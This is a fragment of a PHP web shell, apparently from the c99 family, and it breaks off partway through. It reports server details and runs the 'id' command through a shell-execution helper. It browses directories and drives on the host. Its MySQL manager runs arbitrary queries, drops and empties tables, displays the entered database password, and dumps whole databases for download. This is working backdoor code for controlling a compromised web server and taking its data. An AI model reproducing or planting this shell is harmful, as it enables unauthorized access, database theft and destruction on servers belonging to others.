<?php echo getenv("HTTP_HOST"); ?><?php echo $surl; ?><?php echo $shver; ?><?php echo $DISP_SERVER_SOFTWARE; ?><?php echo wordwrap(php_uname(),90,"<br>",1); ?><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?><?php echo $hsafemode; ?><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($t)."';document.todo.sort.value='".$sort."';document.todo.submit();\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (is_writable($d))
{
 $wd = TRUE;
 $wdt = "<font color=green>[ ok ]</font>";
 echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
}
else
{
 $wd = FALSE;
 $wdt = "<font color=red>[ Read-Only ]</font>";
 echo "<b>".view_perms_color($d)."</b>";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
 if ($free < 0) {$free = 0;}
 if ($total < 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
}
echo "<br>";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
  if (!$bool) {$bool = is_dir($letter.":\\");}
  if ($bool)
  {
   $letters .= "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($letter.":\\")."';document.todo.submit();\">[ ";
   if ($letter.":" != $v) {$letters .= $letter;}
   else {$letters .= "<font color=green>".$letter."</font>";}
   $letters .= " ]</a> ";
  }
 }
 if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}
}
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%sort",$sort,$item[1]);
  $v = realpath($d."..");
  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
  $item[1] = str_replace("%upd",urlencode($v),$item[1]);

  echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
echo "</p></td></tr></table><br>";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 echo("<form name='sql' method='POST'><input name='act' type='hidden' value='sql'><input name='sql_tbl_insert_q' type='hidden' value=''><input name='sql_login' type='hidden' value=''><input name='kill' type='hidden' value=''><input name='sql_order' type='hidden' value=''><input name='sql_tbl_ls' type='hidden' value=''><input name='sql_tbl_le' type='hidden' value=''><input name='sql_tbl_act' type='hidden' value=''><input name='thistbl' type='hidden' value=''><input name='sql_passwd' type='hidden' value=''><input name='sql_server' type='hidden' value=''><input name='sql_port' type='hidden' value=''><input name='sql_db' type='hidden' value=''><input name='sql_act' type='hidden' value=''><input name='sql_tbl' type='hidden' value=''><input name='f' type='hidden' value=''><input name='ft' type='hidden' value=''><input name='sql_query' type='hidden' value=''></form>");

 if (isset($_POST['sql_login']))  {$sql_login=htmlspecialchars($_POST['sql_login']);}
 if (isset($_POST['sql_passwd'])) {$sql_passwd=htmlspecialchars($_POST['sql_passwd']);}
 if (isset($_POST['sql_server'])) {$sql_server=htmlspecialchars($_POST['sql_server']);}
 if (isset($_POST['sql_port']))   {$sql_port=htmlspecialchars($_POST['sql_port']);}
 if (isset($_POST['sql_db']))     {$sql_db=htmlspecialchars($_POST['sql_db']);}
 if (isset($_POST['sql_act']))     {$sql_act=htmlspecialchars($_POST['sql_act']);}
 if (isset($_POST['sql_tbl']))     {$sql_tbl=htmlspecialchars($_POST['sql_tbl']);}
 if (isset($_POST['sql_tbl_act']))     {$sql_tbl_act=htmlspecialchars($_POST['sql_tbl_act']);}
 if (isset($_POST['thistbl']))     {$thistbl=htmlspecialchars($_POST['thistbl']);}
 if (isset($_POST['sql_order']))     {$sql_order=htmlspecialchars($_POST['sql_order']);}
 if (isset($_POST['sql_tbl_ls']))     {$sql_tbl_ls=htmlspecialchars($_POST['sql_tbl_ls']);}
 if (isset($_POST['sql_tbl_le']))     {$sql_tbl_le=htmlspecialchars($_POST['sql_tbl_le']);}
 if (isset($_POST['sql_query']))     {$sql_query=htmlspecialchars($_POST['sql_query']);}
 if (isset($_POST['sql_tbl_insert_q'])) {$sql_tbl_insert_q=urldecode(htmlspecialchars($_POST['sql_tbl_insert_q']));}
 if (isset($_POST['sql_tbl_insert_functs'])) {$sql_tbl_insert_functs=htmlspecialchars($_POST['sql_tbl_insert_functs']);}
 if (isset($_POST['sql_tbl_insert_radio'])) {$sql_tbl_insert_radio=htmlspecialchars($_POST['sql_tbl_insert_radio']);}



 ?><?php
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
  $err = mysql_smarterror();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = FALSE;}
 echo "<b>SQL Manager:</b><br>";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "NO CONNECTION";}
  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();");
  $sqlquicklaunch[] = array("Query","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();");
  $sqlquicklaunch[] = array("Server-status","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='serverstatus';document.sql.submit();");
  $sqlquicklaunch[] = array("Server variables","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='servervars';document.sql.submit();");
  $sqlquicklaunch[] = array("Processes","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='processes';document.sql.submit();");
  $sqlquicklaunch[] = array("Logout","#\" onclick=\"document.sql.act.value='sql';document.sql.submit();");
  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";
  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}}
  echo "</center>";
 }
 echo "</td></tr><tr>";
 if (!$sql_sock) {?><?php echo $surl; ?><?php }
 else
 {
  //Start left panel
  if (!empty($sql_db))
  {
   ?><?php
   $result = mysql_list_tables($sql_db);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    echo "---[ <a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_db.value='".htmlspecialchars($sql_db)."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>�&nbsp;<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".htmlspecialchars($sql_db)."';document.sql.sql_tbl.value='".htmlspecialchars($row[0])."';document.sql.submit();\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
    if (!$c) {echo "No tables found in database.";}
   }
  }
  else
  {
   ?><?php echo $_SERVER['PHP_SELF']; ?><?php
   $result = mysql_list_dbs($sql_sock);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    ?><?php echo htmlspecialchars($sql_login); ?><?php echo htmlspecialchars($sql_passwd); ?><?php echo htmlspecialchars($sql_server); ?><?php echo htmlspecialchars($sql_port); ?><?php
    $c = 0;
    $dbs = "";
    while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
    echo "<option value=\"\">Databases (".$c.")</option>";
    echo $dbs;
   }
   ?><?php
  }
  //End left panel
  echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
  //Start center panel
  $diplay = TRUE;
  if ($sql_db)
  {
   if (!is_numeric($c)) {$c = 0;}
   if ($c == 0) {$c = "no";}
   echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
   if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
   echo "</b></center>";
   $acts = array("","dump");
   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
   elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
   elseif ($sql_tbl_act == "insert")
   {
    if ($sql_tbl_insert_radio == 1)
    {
     $keys = "";
     $akeys = array_keys($sql_tbl_insert);
     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
     $values = "";
     $i = 0;
     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
    elseif ($sql_tbl_insert_radio == 2)
    {
     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
     $result = mysql_query($sql_query) or print(mysql_smarterror());
     $result = mysql_fetch_array($result, MYSQL_ASSOC);
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
   }
   if ($sql_act == "query")
   {
    $sql_query = urldecode($sql_query);
    echo "<hr size=\"1\" noshade>";
    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";}
   }
   if (in_array($sql_act,$acts))
   {
    ?><?php echo htmlspecialchars($sql_db); ?><?php echo htmlspecialchars($sql_login); ?><?php echo htmlspecialchars($sql_passwd); ?><?php echo htmlspecialchars($sql_server); ?><?php echo htmlspecialchars($sql_port); ?><?php echo htmlspecialchars($sql_db); ?><?php echo htmlspecialchars($sql_login); ?><?php echo htmlspecialchars($sql_passwd); ?><?php echo htmlspecialchars($sql_server); ?><?php echo htmlspecialchars($sql_port); ?><?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?><?php
    if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
    if ($sql_act == "newtbl")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
    }
    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
   }
   elseif ($sql_act == "dump")
   {
    if (empty($submit))
    {
     $diplay = FALSE;
     echo "<form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
     echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
     $v = join (";",$dmptbls);
     echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
     if ($dump_file) {$tmp = $dump_file;}
     else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
     echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
     echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
     echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
     echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
     echo "</form>";
    }
    else
    {
     $diplay = TRUE;
     $set = array();
     $set["sock"] = $sql_sock;
     $set["db"] = $sql_db;
     $dump_out = "download";
     $set["print"] = 0;
     $set["nl2br"] = 0;
     $set[""] = 0;
     $set["file"] = $dump_file;
     $set["add_drop"] = TRUE;
     $set["onlytabs"] = array();
     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
     $ret = mysql_dump($set);
     if ($sql_dump_download)
     {
      @ob_clean();
      header("Content-type: application/octet-stream");
      header("Content-length: ".strlen($ret));
      header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
      echo $ret;
      exit;
     }
     elseif ($sql_dump_savetofile)
     {
      $fp = fopen($sql_dump_file,"w");
      if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
      else
      {
       fwrite($fp,$ret);
       fclose($fp);
       echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
      }
     }
     else {echo "<b>Dump: nothing to do!</b>";}
    }
   }
   if ($diplay)
   {
    if (!empty($sql_tbl))
    {
     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
     $count_row = mysql_fetch_array($count);
     mysql_free_result($count);
     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
     $tbl_struct_fields = array();
     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
     if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
     $perpage = $sql_tbl_le - $sql_tbl_ls;
     if (!is_numeric($perpage)) {$perpage = 10;}
     $numpages = $count_row[0]/$perpage;
     $e = explode(" ",$sql_order);
     if (count($e) == 2)
     {
      if ($e[0] == "d") {$asc_desc = "DESC";}
      else {$asc_desc = "ASC";}
      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
     }
     else {$v = "";}
     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
     $result = mysql_query($query) or print(mysql_smarterror());
     echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
     echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='structure';document.sql.submit();\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='browse';document.sql.submit();\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_act.value='tbldump';document.sql.thistbl.value='1';document.sql.submit();\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='insert';document.sql.thistbl.value='1';document.sql.submit();\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
     if ($sql_tbl_act == "insert")
     {
      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
      if (!empty($sql_tbl_insert_radio))
      {

      }
      else
      {
       echo "<br><br><b>Inserting row into table:</b><br>";
       if (!empty($sql_tbl_insert_q))
       {
        $sql_query = "SELECT * FROM `".$sql_tbl."`";
        $sql_query .= " WHERE".$sql_tbl_insert_q;
        $sql_query .= " LIMIT 1;";
        $sql_query = urldecode($sql_query);
        $sql_tbl_insert_q = urldecode($sql_tbl_insert_q);
        $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
        $values = mysql_fetch_assoc($result);
        mysql_free_result($result);
       }
       else {$values = array();}
       echo "<form method=\"POST\"><input type=hidden name='sql_tbl_act' value='insert'><input type=hidden name='sql_tbl_insert_q' value='".urlencode($sql_tbl_insert_q)."'><input type=hidden name='sql_tbl_ls' value='".$sql_tbl_ls."'><input type=hidden name='sql_tbl_le' value='".$sql_tbl_le."'><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"act\" value=\"sql\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";

       foreach ($tbl_struct_fields as $field)
       {
        $name = $field["Field"];
        if (empty($sql_tbl_insert_q)) {$v = "";}
        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
        $i++;
       }
       echo "</table><br>";
       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
       if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
       echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
      }
     }
     if ($sql_tbl_act == "browse")
     {
      $sql_tbl_ls = abs($sql_tbl_ls);
      $sql_tbl_le = abs($sql_tbl_le);
      echo "<hr size=\"1\" noshade>";
      $b = 0;
      for($i=0;$i<$numpages;$i++)
      {
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.thistbl.value='1';document.sql.sql_order.value='".htmlspecialchars($sql_order)."';document.sql.sql_tbl_ls.value='".($i*$perpage)."';document.sql.sql_tbl_le.value='".($i*$perpage+$perpage)."';document.sql.submit();\"><u>";}
       echo $i;
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
       if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
       else {echo "&nbsp;";}
      }
      if ($i == 0) {echo "empty";}
